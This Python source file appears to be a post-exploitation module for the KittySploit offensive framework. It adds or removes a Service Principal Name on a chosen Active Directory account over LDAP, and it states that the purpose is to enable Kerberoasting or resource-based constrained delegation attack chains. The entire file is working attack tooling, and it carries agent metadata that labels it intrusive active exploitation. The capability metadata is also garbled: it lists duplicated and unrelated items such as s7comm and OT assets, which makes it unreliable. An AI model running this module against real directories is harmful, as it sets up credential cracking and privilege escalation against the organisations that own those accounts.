from kittysploit import *
from lib.protocols.ldap.ldap_post_client import LdapPostClient


class Module(Post, LdapPostClient):

	__info__ = {
		"name": "LDAP Add Service Principal Name",
		"description": "Add or remove an SPN on a target account to enable Kerberoast or RBCD prep chains",
		"author": "KittySploit Team",
		"session_type": SessionType.LDAP,
		"tags": ["ad", "ldap", "spn", "kerberoast", "rbcd", "manage"],
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['active_exploitation', 'account_modification'],
	    'expected_requests': 2,
	    'reversible': True,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	    'cost': 1.5,
	    'noise': 0.5,
	    'value': 1.0,
	    'requires': 	    {'min_endpoints': 0,
	     'min_params': 0,
	     'tech_hints_any': [],
	     'tech_hints_all': [],
	     'specializations_any': [],
	     'risk_signals_any': [],
	     'auth_session': False,
	     'capabilities_any': [],
	     'capabilities_all': [],
	     'confidence_min': {},
	     'confidence_min_any': {},
	     'endpoint_pattern_any': [],
	     'param_any': [],
	     'api_surface_ready': False},
	    'chain': 	    {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 's7comm', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''}],
	     'consumes_capabilities': ['shell'],
	     'option_bindings': {},
	     'suggested_followups': []},
	},
	}

	target = OptString("", "Target sAMAccountName or distinguishedName", True)
	spn = OptString("", "Service Principal Name to add/remove", True)
	action = OptChoice(
		"add",
		"Operation to perform",
		True,
		choices=["add", "remove"],
	)
	dry_run = OptBool(False, "Only show the planned LDAP modify", False)

	def run(self):
		try:
			target_value = str(self.target or "").strip()
			spn_value = str(self.spn or "").strip()
			if not target_value or not spn_value:
				raise ProcedureError(
					FailureType.ConfigurationError, "target and spn are required"
				)

			if target_value.lower().startswith("cn=") or target_value.lower().startswith("ou="):
				target_dn = target_value
				sam = ""
			else:
				entry = self.find_by_sam(target_value)
				if not entry:
					raise ProcedureError(
						FailureType.NotFound, f"Account not found: {target_value}"
					)
				target_dn = getattr(entry, "entry_dn", "") or self.attr_str(entry, "distinguishedName")
				sam = self.attr_str(entry, "sAMAccountName")

			if not target_dn:
				raise ProcedureError(FailureType.NotFound, "Could not resolve target DN")

			print_info("=" * 80)
			print_status(f"SPN {self.action} on {sam or target_dn}")
			print_info(f"  DN:  {target_dn}")
			print_info(f"  SPN: {spn_value}")

			if self.dry_run:
				print_warning("Dry run — no LDAP modify sent")
				return True

			if str(self.action).lower() == "remove":
				self.remove_spn(target_dn, spn_value)
				print_success(f"Removed SPN {spn_value}")
			else:
				self.add_spn(target_dn, spn_value)
				print_success(f"Added SPN {spn_value}")

			print_info("=" * 80)
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"SPN modify failed: {exc}")
